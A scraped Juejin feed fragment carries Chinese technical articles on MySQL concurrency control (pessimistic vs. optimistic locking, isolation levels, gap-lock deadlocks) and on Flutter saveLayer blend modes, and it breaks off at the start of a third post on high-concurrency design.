ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在电商或金融系统中，<strong>并发控制</strong>是最核心的挑战之一。</p>
<p>很多开发者在写“扣减库存”逻辑时，习惯写出这样的代码：</p>
<ol>
<li>查询当前库存：SELECT stock FROM products WHERE id = 1;</li>
<li>应用层判断：if (stock &gt; 0)</li>
<li>更新库存：UPDATE products SET stock = stock - 1 WHERE id = 1;</li>
</ol>
<p>在低并发下这没问题。但在高并发场景下，两个线程可能同时读到 stock=1，同时通过校验，分别执行 UPDATE。结果是：卖出了两件商品，库存变成了 -1。</p>
<p>这就是典型的<strong>竞态条件</strong>。解决这个问题的终极战场不在应用层，而在数据库层。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f10f5cd9622455dac57bcfa2ad03e30~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507109&amp;x-signature=gKB4v5HANGrXk4BPbdj05OTVuy8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">一、 悲观锁 vs 乐观锁：如何安全地扣减库存？</h2>
<h2 data-id="heading-1">1. 悲观锁 (Pessimistic Locking)：SELECT ... FOR UPDATE</h2>
<p>悲观锁的核心思想是：“总有人想跟我抢，我先锁住再说。”</p>
<p>在 MySQL InnoDB 中，我们可以通过 FOR UPDATE 显式添加<strong>排他锁 (X Lock)</strong>。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">START</span> TRANSACTION;

<span class="hljs-comment">-- 1. 显式加锁。此时其他事务如果想查或改这行数据，必须等待</span>
<span class="hljs-keyword">SELECT</span> stock <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">UPDATE</span>;

<span class="hljs-comment">-- 2. 只有拿到锁的事务才能执行后续逻辑</span>
<span class="hljs-comment">-- (应用层判断 stock &gt; 0)</span>
<span class="hljs-keyword">UPDATE</span> products <span class="hljs-keyword">SET</span> stock <span class="hljs-operator">=</span> stock <span class="hljs-operator">-</span> <span class="hljs-number">1</span> <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;

<span class="hljs-keyword">COMMIT</span>;
</code></pre>
<p>优点： 强一致性，完全避免超卖。</p>
<p>缺点： 性能开销大。锁的持有时间 = 事务执行时间。在高并发下，会造成大量请求阻塞，甚至超时。</p>
<p>适用场景： 写入频繁、强一致性要求极高、并发量适中的场景（如转账）。</p>
<h2 data-id="heading-2">2. 乐观锁 (Optimistic Locking)：基于 CAS (Compare-and-Swap)</h2>
<p>乐观锁的核心思想是：“大家随便拿，但我更新时要检查一下数据有没有变。”</p>
<p>这不需要数据库显式加锁，而是通过版本号 (version) 机制在 SQL 层面实现。</p>
<p>我们需要在表中增加一个 version 字段。</p>
<pre><code class="hljs language-ini" lang="ini">-- 1. 查询数据，同时拿到版本号 (假设 <span class="hljs-attr">version</span> = <span class="hljs-number">10</span>)
SELECT stock, version FROM products WHERE <span class="hljs-attr">id</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>

-- 2. 更新时，校验版本号是否依然是 10
UPDATE products 
SET <span class="hljs-attr">stock</span> = stock - <span class="hljs-number">1</span>, version = version + <span class="hljs-number">1</span> 
WHERE <span class="hljs-attr">id</span> = <span class="hljs-number">1</span> AND version = <span class="hljs-number">10</span><span class="hljs-comment">;</span>
</code></pre>
<p>逻辑解析：</p>
<p>如果 SQL 返回 Affected rows: 1，说明扣减成功。</p>
<p>如果返回 0，说明在查询和更新之间，有别的事务修改了数据（version 变成了 11）。此时应用层应捕获这个失败，并进行重试（Retry）或报错。</p>
<p>优点： 无锁（No-Locking），并发性能极高。</p>
<p>缺点： 在冲突激烈的场景下，重试率高，可能浪费 CPU。</p>
<p>适用场景： 读多写少、追求高吞吐量的场景（如秒杀）。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43239a87ea574457837c79bb92fb9011~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507109&amp;x-signature=qQgPxcW13eIdrBdulEvXnHJZUAU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-3">二、 事务隔离级别：脏读与幻读的权衡</h2>
<p>MySQL 默认的隔离级别是 <strong>RR (Repeatable Read)</strong>，而 Oracle/PostgreSQL 默认通常是 <strong>RC (Read Committed)</strong>。这两者的区别直接影响业务逻辑的正确性。</p>
<h2 data-id="heading-4">1. 脏读 (Dirty Read)</h2>
<p>A 事务读取了 B 事务<strong>未提交</strong>的数据。</p>
<ul>
<li><strong>发生场景：</strong> READ UNCOMMITTED 级别。</li>
<li><strong>结论：</strong> 生产环境严禁使用，除非你在做极其粗略的统计。</li>
</ul>
<h2 data-id="heading-5">2. 不可重复读 (Non-Repeatable Read)</h2>
<p>A 事务里两次读取同一行数据，结果不一样（因为 B 事务在中间提交了修改）。</p>
<ul>
<li><strong>RC 级别</strong>允许发生。</li>
<li><strong>RR 级别</strong>通过 <strong>MVCC (多版本并发控制)</strong> 解决了这个问题。在 RR 下，事务开启时会生成一个快照 (Snapshot)，后续读取的都是快照版本。</li>
</ul>
<h2 data-id="heading-6">3. 幻读 (Phantom Read)</h2>
<p>A 事务读取了一个范围（如 id &gt; 10），B 事务插入了一条新数据 id=11。A 再次读取时，发现多了一条“幽灵”数据。</p>
<ul>
<li><strong>MySQL 的 RR 级别</strong>通过 <strong>Next-Key Lock (间隙锁)</strong> 在很大程度上解决了幻读，但也带来了死锁隐患。</li>
</ul>
<h2 data-id="heading-7">三、 死锁 (Deadlock) 排查：看不见的“间隙锁”</h2>
<p>很多开发者认为：“我只锁了一行数据，为什么会死锁？”</p>
<p>在 MySQL 的 RR 隔离级别下，最常见的死锁凶手是 间隙锁 (Gap Lock)。</p>
<p>场景复现：</p>
<p>表 t_user 有 id 为 10, 20 的两条记录。</p>
<p><strong>事务 A：</strong></p>
<pre><code class="hljs language-ini" lang="ini">-- 试图更新一条不存在的记录 (<span class="hljs-attr">id</span>=<span class="hljs-number">15</span>)
UPDATE t_user SET <span class="hljs-attr">name</span> = <span class="hljs-string">'A'</span> WHERE id = <span class="hljs-number">15</span><span class="hljs-comment">;</span>
</code></pre>
<p><strong>解析：</strong> 因为 id=15 不存在，MySQL 为了防止幻读，会锁住 (10, 20) 这个<strong>间隙 (Gap)</strong>，不许别人在这个范围内插入数据。</p>
<p><strong>事务 B：</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 试图插入一条记录 (id=16)</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> t_user (id, name) <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">16</span>, <span class="hljs-string">'B'</span>);
</code></pre>
<p><strong>解析：</strong> id=16 落在 (10, 20) 间隙内，被事务 A 的间隙锁阻塞，进入等待。</p>
<p>死锁形成：</p>
<p>如果事务 A 此时也想执行 INSERT INTO t_user (id, name) VALUES (16, 'A');，它会发现事务 B 也在申请锁，于是形成环路：A 等 B 释放意向锁，B 等 A 释放间隙锁 -&gt; Deadlock found。</p>
<p>如何排查？</p>
<p>当发生死锁时，应用层通常只会收到一个 Generic Error。要看详情，需要执行：</p>
<pre><code class="hljs language-ini" lang="ini">SHOW ENGINE INNODB STATUS<span class="hljs-comment">;</span>
</code></pre>
<p>在输出的 LATEST DETECTED DEADLOCK 章节中，你会看到清晰的日志：</p>
<ul>
<li>LOCK WAIT</li>
<li>RECORD LOCKS space id ... index PRIMARY ... lock_mode X locks gap before rec （关键词：locks gap）</li>
</ul>
<p><strong>注意：</strong></p>
<ol>
<li>尽量让 UPDATE/DELETE 语句命中唯一索引，避免产生间隙锁。</li>
<li>在高并发写入场景下，考虑将隔离级别降级为 <strong>RC (Read Committed)</strong>（RC 没有间隙锁），通过业务层逻辑保证一致性。</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bb340057cf554b2d98d529392f60c4a4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5pWw5o2u5bCP6aaS5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768507109&amp;x-signature=tsjkac5B6aqviOoOP90hvvYgbrA%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-8">总结</h2>
<p>并发控制是数据库技术的深水区：</p>
<ol>
<li><strong>防止超卖</strong>：优先考虑 <strong>乐观锁 (Version CAS)</strong>，只有在高冲突场景下才使用 <strong>悲观锁 (FOR UPDATE)</strong>。</li>
<li><strong>隔离级别</strong>：清楚你的数据库跑在 RC 还是 RR 下。MySQL 默认的 RR 虽然安全，但会引入额外的 <strong>Gap Lock</strong> 开销和死锁风险。</li>
<li><strong>死锁分析</strong>：遇到死锁别慌，通过 SHOW ENGINE INNODB STATUS 分析锁等待链，通常是因为对“不存在的记录”加锁导致的间隙锁冲突。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutter 混合模式下：saveLayer 混合注意点]]></title>    <link>https://juejin.cn/post/7592887786966351908</link>    <guid>https://juejin.cn/post/7592887786966351908</guid>    <pubDate>2026-01-09T03:24:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592887786966351908" data-draft-id="7592912896591364115" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutter 混合模式下：saveLayer 混合注意点"/> <meta itemprop="keywords" content="Flutter,Android"/> <meta itemprop="datePublished" content="2026-01-09T03:24:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火柴就是我"/> <meta itemprop="url" content="https://juejin.cn/user/272334614705575"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutter 混合模式下：saveLayer 混合注意点
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/272334614705575/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火柴就是我
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:24:13.000Z" title="Fri Jan 09 2026 03:24:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>直接Paint 绘制混合</p>
<pre><code class="hljs language-js" lang="js">    canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), <span class="hljs-title class_">Paint</span>());
    <span class="hljs-title class_">Paint</span> dstPaint = <span class="hljs-title class_">Paint</span>()..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">red</span>;
    dstPaint.<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">20</span>;
    dstPaint.<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">stroke</span>;
    canvas.<span class="hljs-title function_">drawImageRect</span>(image!, <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, image!.<span class="hljs-property">width</span>.<span class="hljs-title function_">toDouble</span>(), image!.<span class="hljs-property">height</span>.<span class="hljs-title function_">toDouble</span>()), <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), dstPaint);

    <span class="hljs-keyword">var</span> srcPaint = <span class="hljs-title class_">Paint</span>()
      ..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">yellowAccent</span> <span class="hljs-comment">// 源颜色：蓝色</span>
      ..<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">fill</span> <span class="hljs-comment">// 填充模式</span>
      ..<span class="hljs-property">blendMode</span> = ui.<span class="hljs-property">BlendMode</span>.<span class="hljs-property">clear</span>
      ..<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">70</span>; <span class="hljs-comment">// 混合模式</span>
    canvas.<span class="hljs-title function_">drawRect</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height).<span class="hljs-title function_">deflate</span>(<span class="hljs-number">100</span>), srcPaint);
</code></pre>
<p>效果图：</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ca0ab18fc0104e1d80d75a1cc2911f2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533853&amp;x-signature=ixgv4WOlft17x7UqUQBFAz0m0vo%3D" alt="image.png" width="30%" loading="lazy"/>
<p>但是如果改成如下：</p>
<pre><code class="hljs language-js" lang="js">    canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), <span class="hljs-title class_">Paint</span>());
    <span class="hljs-title class_">Paint</span> dstPaint = <span class="hljs-title class_">Paint</span>()..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">red</span>;
    dstPaint.<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">20</span>;
    dstPaint.<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">stroke</span>;
    canvas.<span class="hljs-title function_">drawImageRect</span>(image!, <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, image!.<span class="hljs-property">width</span>.<span class="hljs-title function_">toDouble</span>(), image!.<span class="hljs-property">height</span>.<span class="hljs-title function_">toDouble</span>()), <span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height), dstPaint);
    
    canvas.<span class="hljs-title function_">saveLayer</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width/<span class="hljs-number">2</span>, height/<span class="hljs-number">2</span>), ui.<span class="hljs-title class_">Paint</span>()
    ..<span class="hljs-property">blendMode</span> = ui.<span class="hljs-property">BlendMode</span>.<span class="hljs-property">clear</span>);

    <span class="hljs-keyword">var</span> srcPaint = <span class="hljs-title class_">Paint</span>()
      ..<span class="hljs-property">color</span> = <span class="hljs-title class_">Colors</span>.<span class="hljs-property">yellowAccent</span> <span class="hljs-comment">// 源颜色：蓝色</span>
      ..<span class="hljs-property">style</span> = <span class="hljs-title class_">PaintingStyle</span>.<span class="hljs-property">fill</span> <span class="hljs-comment">// 填充模式</span>
      ..<span class="hljs-property">strokeWidth</span> = <span class="hljs-number">70</span>; <span class="hljs-comment">// 混合模式</span>
    canvas.<span class="hljs-title function_">drawRect</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width, height).<span class="hljs-title function_">deflate</span>(<span class="hljs-number">100</span>), srcPaint);
</code></pre>
<p>目测代码逻辑是一样的只是把混合模式设置给了Layer。但是最终效果就是界面上啥页没有全部被清空了。这是因为设置了混合模式之后,整个图层都会被当作src 进行混合。并且第一个设置范围的参数也不生效。</p>
<p>如果想限制到指定范围可以在saveLayer前加如下内容:</p>
<pre><code class="hljs language-js" lang="js">  canvas.<span class="hljs-title function_">clipRect</span>(<span class="hljs-title class_">Rect</span>.<span class="hljs-title function_">fromLTWH</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, width/<span class="hljs-number">2</span>, height/<span class="hljs-number">2</span>));
</code></pre>
<p>那么加完之后的效果图如下:</p>
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/558f554184234155b5564810a7766348~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg54Gr5p-05bCx5piv5oiR:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768533853&amp;x-signature=wsSloCb0DJ%2BswQJUI2LyUk7FxSE%3D" alt="image.png" width="30%" loading="lazy"/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[如何设计一个高并发系统？]]></title>    <link>https://juejin.cn/post/7593139476832518187</link>    <guid>https://juejin.cn/post/7593139476832518187</guid>    <pubDate>2026-01-09T03:31:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593139476832518187" data-draft-id="7593139476832501803" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="如何设计一个高并发系统？"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-09T03:31:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="苏三说技术"/> <meta itemprop="url" content="https://juejin.cn/user/465848661970824"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            如何设计一个高并发系统？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848661970824/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    苏三说技术
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:31:06.000Z" title="Fri Jan 09 2026 03:31:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读27分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body 